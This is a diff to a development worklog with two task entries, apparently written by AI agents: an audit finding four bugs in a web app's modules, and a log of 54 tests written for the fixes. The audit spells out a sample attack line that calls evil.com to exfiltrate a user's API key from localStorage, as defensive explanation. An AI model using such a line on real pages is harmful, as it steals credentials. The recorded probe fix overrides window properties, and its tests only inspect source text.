@@ -5412,3 +5412,123 @@ Stage Summary:
 - page.tsx reduced from 4645 to 4504 lines (constants extracted)
 - 62 new integration tests covering /api/settings, /api/backup, /api/run
 - All changes committed and pushed to GitHub (v29.43)
+
+---
+Task ID: 1009
+Agent: bug-auditor-2
+Task: Manual bug audit of 14 remaining source modules
+
+Work Log:
+- Read /home/z/my-project/worklog.md (Tasks 1–4 + 1001 + 1003–1008) to understand the project architecture, conventions, and previously fixed bugs.
+- Read all 14 target source modules in full:
+  - src/lib/build-memory.ts (449 lines) — IndexedDB build cache
+  - src/lib/smart-suggestions.ts (171 lines) — suggestion generation
+  - src/lib/interaction-probe.ts (371 lines) — runtime interaction probing
+  - src/lib/error-recovery.ts (385 lines) — error analysis and recovery
+  - src/lib/multi-file.ts (549 lines) — multi-file parsing and inlining
+  - src/lib/diff.ts (305 lines) — diff generation
+  - src/lib/build-comparison.ts (74 lines) — build comparison
+  - src/lib/build-health.ts (72 lines) — build health scoring
+  - src/lib/mission-analysis.ts (193 lines) — mission analysis
+  - src/lib/build-intelligence.ts (321 lines) — output validation and quality scoring
+  - src/lib/golden-templates.ts (909 lines) — golden template matching
+  - src/lib/zip.ts (230 lines) — ZIP file creation
+  - src/lib/helpers.ts (113 lines) — shared utilities
+  - src/lib/logger.ts (73 lines) — structured logging
+- Read supporting modules to understand contracts: src/lib/html-utils.ts (stripCodeFences, looksLikeHtml, injectCsp, stripBlockedAPIs), src/lib/runtime-errors.ts (RUNTIME_ERROR_SCRIPT, injectRuntimeErrorCapture), src/app/page.tsx (probeApp call sites, preview iframe sandbox settings), src/app/api/build/code/route.ts (parseOutput call site, prompt instructions), next.config.ts (security headers).
+- For each file, checked for: null/undefined access without checks, off-by-one errors, race conditions in async code, missing error handling, incorrect conditional logic, security issues, resource leaks, incorrect type assumptions, dead code, state management bugs, incorrect regex patterns, boundary conditions.
+- Cross-referenced the probe iframe's sandbox settings against the preview iframe's settings (page.tsx line 3929: `sandbox="allow-scripts"` — NO allow-same-origin) and next.config.ts (no CSP header on the parent page).
+- Verified the multi-file fence bug by running a test script that calls parseOutput with two ```file:path fences — confirmed only the first file is captured.
+- Verified the interaction-probe security issue by confirming: (1) probe iframe uses `allow-same-origin`, (2) the HTML passed to probeApp has CSP injected by the route handler, but CSP only restricts the iframe's own requests, not parent.fetch, (3) next.config.ts has no CSP header on the parent page, so parent.fetch is unrestricted.
+
+Stage Summary:
+- 4 bugs found across 3 files. 2 HIGH, 0 MEDIUM, 2 LOW.
+
+BUG #1: [src/lib/interaction-probe.ts:76] [severity: high]
+Description: The probe iframe uses `iframe.sandbox = 'allow-scripts allow-same-origin'`. The `allow-same-origin` flag gives the LLM-generated HTML same-origin access to the parent window (NOVA's page). The preview iframe in page.tsx (line 3929) correctly uses `sandbox="allow-scripts"` WITHOUT `allow-same-origin`, but the probe iframe does not. The route handler injects a CSP meta tag into the HTML, but that CSP only restricts the iframe's own network requests — it does NOT restrict `parent.fetch(...)`. next.config.ts defines no CSP header for the parent page.
+Impact: If the LLM generates malicious HTML (e.g., due to prompt injection in the user's mission), the probe iframe's scripts can call `parent.fetch('https://evil.com', { method: 'POST', body: parent.localStorage.getItem('zai_api_key') })` and exfiltrate the user's API keys (zai/dashscope/tokenrouter) stored in localStorage. The probe runs automatically on every build, so every build is an attack surface. This is a real XSS/data-exfiltration vulnerability.
+Suggested fix: Remove `allow-same-origin` from the probe iframe sandbox. Instead of directly accessing `iframe.contentDocument` to click buttons, inject a probe script into the iframe HTML that performs the interactions and reports results via `postMessage` (same pattern as runtime-errors.ts). This matches the preview iframe's security model.
+
+BUG #2: [src/lib/multi-file.ts:422-445] [severity: high]
+Description: `parseOutput` extracts the file path from only the FIRST ```file:path fence (`text.match(/```file:([^\n]+)\n/i)` — no `g` flag, returns first match only). It then calls `stripCodeFences(text)` which returns only the FIRST non-empty fence's content. The function returns early with a single-file result. If the LLM emits multiple ```file:path fences (as instructed by the code route prompt at line 138: "Repeat for each file"), all files after the first are silently lost.
+Impact: When a user requests a multi-file project (e.g., a Python package with multiple modules), the LLM emits multiple ```file:path fences. `parseOutput` captures only the first file; the rest are silently dropped. The user receives an incomplete project with only 1 file. Verified by test: input with two fences (app.py + utils.py) → output has only app.py. The code route calls `parseOutput(rawHtml)` at line 477 and sends `resultData.files` to the client, so this bug affects production.
+Suggested fix: Rewrite the fence-parsing branch to find ALL ```file:path fences (using a global regex), extract each path+content pair, and return a MultiFileResult with all files. Fall back to the current single-file logic only when exactly one fence is present.
+
+BUG #3: [src/lib/build-health.ts:35-39] [severity: low]
+Description: The `score` variable is computed (quality + missingFeatures*10 + staticErrors*15 + buildTime penalty) but is NEVER used. The grade is determined solely by the if/else ladder on lines 41-70, which checks `quality`, `missingFeatures`, `staticErrors`, and `buildTimeMin` directly. The `score` calculation has zero effect on the output.
+Impact: Dead code — misleading to readers who assume `score` determines the grade. No functional impact (the if/else ladder produces correct grades), but a future developer might "fix" the ladder to use `score` and inadvertently change behavior. Also noted as a documented quirk in Task 1005's tests.
+Suggested fix: Either remove the `score` calculation (lines 35-39) or use it to determine the grade (replacing the if/else ladder). Removing it is simpler and safer.
+
+BUG #4: [src/lib/multi-file.ts:380-385] [severity: low]
+Description: The second `<link>` regex (`/<link\s+[^>]*?href=["']([^"']+)["'][^>]*?rel=["']stylesheet["'][^>]*?>/gi`) is redundant. The first regex (`/<link\s+[^>]*?rel=["']stylesheet["'][^>]*?>/gi`) already matches link tags regardless of attribute order — its `[^>]*?` before `rel` matches `href="..."` and other attributes in any position. Since the first regex runs first and replaces all matching tags with `<style>` blocks, the second regex never finds any matches.
+Impact: Dead code — the second regex and its replacement function never execute. No functional impact, but adds ~6 lines of unreachable code that may confuse readers.
+Suggested fix: Remove the second regex block (lines 380-385). The first regex handles both `rel`-first and `href`-first attribute orderings.
+
+Files with no bugs found:
+- src/lib/build-memory.ts — IndexedDB cache logic is correct; transactions are properly sequenced; all error paths resolve; TTL/eviction logic is sound.
+- src/lib/smart-suggestions.ts — Heuristic suggestion generation; regex patterns are reasonable; no logic errors.
+- src/lib/error-recovery.ts — Error categorization patterns are correct; mission assessment heuristics are sound; simplifyMission handles edge cases.
+- src/lib/diff.ts — LCS algorithm is correct; backtracking logic is sound; splitLines handles all newline formats; compact diff context expansion is correct.
+- src/lib/build-comparison.ts — Set-based diff has known limitations (documented); size/quality/time calculations are correct.
+- src/lib/mission-analysis.ts — Heuristic analysis; keyword matching uses substring (could false-positive on "ai" in "email") but this is a design choice, not a bug.
+- src/lib/build-intelligence.ts — Weighted validation checks are correct; token budget estimation is sound; quality metrics regexes are reasonable.
+- src/lib/golden-templates.ts — Template matching with word-boundary regex is correct; escapeRegex handles metacharacters.
+- src/lib/zip.ts — CRC-32 implementation is standard; ZIP structure follows the spec; size calculation is correct (verified by counting header bytes).
+- src/lib/helpers.ts — Filename sanitization, history validation, and grouping logic are all correct.
+- src/lib/logger.ts — Structured logging with try-catch for JSON.stringify; level filtering is correct.
+
+---
+Task ID: 1010
+Agent: test-author-bugfix
+Task: Write tests for bug fixes (multi-file parsing, page-constants, build-health score, probe security)
+
+Work Log:
+- Read /home/z/my-project/worklog.md (Tasks 1–4 + 1001 + 1003–1009) to understand the project architecture, previous test patterns (esp. the comprehensive-test conventions from Tasks 1005 and 1006), and the 4 bugs being tested.
+- Read the 4 target source files in full to understand exact contracts and recent fixes:
+  - src/lib/multi-file.ts (BUG #2 — parseOutput now uses a global regex `/```file:([^\n]+)\n([\s\S]*?)```/gi` to extract ALL file fences, skips empty-content fences, preserves content exactly)
+  - src/lib/page-constants.ts (extracted constants module; SUGGESTION_GROUPS has 6 groups — the duplicate art/draw/paint group was removed)
+  - src/lib/build-health.ts (BUG #3 — `score` is now computed, clamped via `Math.max(0, Math.min(100, score))`, and used in the A-grade check `score >= 85 && missingFeatures === 0 && staticErrors === 0 && buildTimeMin <= 3`)
+  - src/lib/interaction-probe.ts (BUG #1 — a `securityScript` is now defined that uses `Object.defineProperty(window, 'parent'|'top'|'opener', { get: ..., configurable: false })` wrapped in try/catch, and injected into `safeHtml` before `iframe.srcdoc = safeHtml`)
+- Created /home/z/my-project/tests/bugfix-comprehensive.test.ts with 54 tests across 4 sections.
+
+KEY DESIGN DECISIONS:
+1. Used `describe` blocks per bug-fix area for readability and to keep the test report scannable.
+2. For the multi-file fence tests, constructed inputs as joined string arrays to make the fence structure visually obvious in the test source (mirrors the format the LLM emits).
+3. For the "empty content fence is skipped" test, used `'   '` (whitespace-only) and `''` (truly empty) — both must be skipped per the `fc.trim()` check in the source.
+4. For the "content preserved exactly" test, embedded leading whitespace lines, middle blank lines, AND trailing whitespace lines — then verified each is preserved via `startsWith` / `toContain` / `endsWith` checks. This catches any future regression that adds a `.trim()`.
+5. For the language-detection tests, used minimal content per fence so the test isolates the path-extension lookup (not the content-based detection fallback).
+6. For the page-constants tests, used referential equality (`expect(result).toBe(group.suggestions)`) to verify getSuggestionsForMission returns the actual array reference from SUGGESTION_GROUPS — not a copy. This is a stronger assertion than `.toEqual()` and catches caching bugs.
+7. For the "deterministic same reference" test, called getSuggestionsForMission twice with the same input and asserted `===` (referential equality).
+8. For the build-health tests, followed the exact scenarios listed in the task spec — using millisecond values that map to the documented minute boundaries (60_000=1min, 180_000=3min, 300_000=5min, 600_000=10min).
+9. For the truncated-output test, used quality=100 with no errors — the strongest possible "would be A" scenario — to prove truncation overrides everything.
+10. For the interaction-probe tests (characterization tests), read the source file once at module load (top-level `fs.readFileSync`) and reused the string across all tests in the section. This is faster than re-reading per test and matches the convention in page-characterization-comprehensive.test.ts.
+11. Used `probeSource.slice(idx, idx + 200)` to grab a generous context window around each `defineProperty` call — this avoids the off-by-one issue where a narrow `[^)]*` regex would stop at the `()` in the arrow function `get: () => null`, missing the `null` token. (Caught this on first run; the opener test failed because the regex matched only `defineProperty(window, 'opener', { get: ()`.)
+12. For the "try/catch error handling" test, counted both `try {` and `catch (` occurrences globally AND within a 1500-char window starting at the securityScript variable — verifying all 3 property definitions are individually wrapped.
+13. For the "configurable: false" test, counted occurrences and asserted `>= 3` (one per property) rather than just checking presence — this catches a regression where only 1-2 properties get the flag.
+
+CHALLENGES & FIXES:
+- First run had 2 failures:
+  1. `"random text with no keywords" → returns DEFAULT_SUGGESTIONS` failed because "text" IS a keyword in the editor group (match: ['editor', 'markdown', 'code', 'text', 'writer']). The task spec's suggested input was incorrect. Fixed by switching to 'build a weather widget' which contains no keyword substrings. Added a comment explaining why.
+  2. `source defines window.opener as null` failed because my regex `/defineProperty\(window,\s*'opener'[^)]*\)/` stopped at the first `)` (inside `get: () =>`), so the matched substring didn't include the `null` token that appears after `=> `. Fixed by switching to a slice-based approach: find the index of the defineProperty call, then slice 200 chars forward and check for 'get', '=>', 'null' within that window. Applied the same robust pattern to the parent and top tests for consistency.
+
+TEST COUNTS (all pass):
+- tests/bugfix-comprehensive.test.ts — 54 tests, 232 expect() calls, 0 failures, 75ms
+
+Breakdown:
+- BUG #2 (multi-file parseOutput): 11 tests (single fence, two fences, three fences, empty-content skipped, content preserved exactly, primary file detection, .py/.js/.ts language detection, mixed languages, file order)
+- page-constants: 23 tests (STARTER_CATEGORIES ×3, SLASH_COMMANDS ×2, REFINE_THINKING_STEPS ×2, SUGGESTION_GROUPS ×5, DEFAULT_SUGGESTIONS ×2, getSuggestionsForMission ×9)
+- BUG #3 (build-health score): 10 tests (6 grade scenarios, truncated override, truncation reason, B-grade reasons, C-grade reasons)
+- BUG #1 (interaction-probe security): 10 tests (parent/top/opener definitions, injection before srcdoc, securityScript variable, configurable:false count, try/catch count, safeHtml injection, security comment)
+
+VERIFICATION:
+- bun test tests/bugfix-comprehensive.test.ts: 54 pass, 0 fail, 232 expect() calls, 75ms.
+- bun run lint: 0 errors, 3 warnings (all pre-existing in run-api-multifile.test.ts, run-api-stdin.test.ts, run-api.test.ts — none from the new file).
+
+Stage Summary:
+- Shipped a single test file (tests/bugfix-comprehensive.test.ts, ~580 LOC) covering all 4 bug-fix areas with 54 passing tests and 232 assertions.
+- All tests are hermetic (no dev server, no network, no DOM). The probe tests are characterization tests that read the source file directly (probeApp requires a browser environment).
+- 0 lint errors, 0 new warnings.
+- Caught and fixed 2 test design issues during the first run (incorrect "no keywords" input, narrow regex missing the `null` token) — both fixes documented inline.
+
+Files Created:
+- tests/bugfix-comprehensive.test.ts (54 tests, ~580 lines)
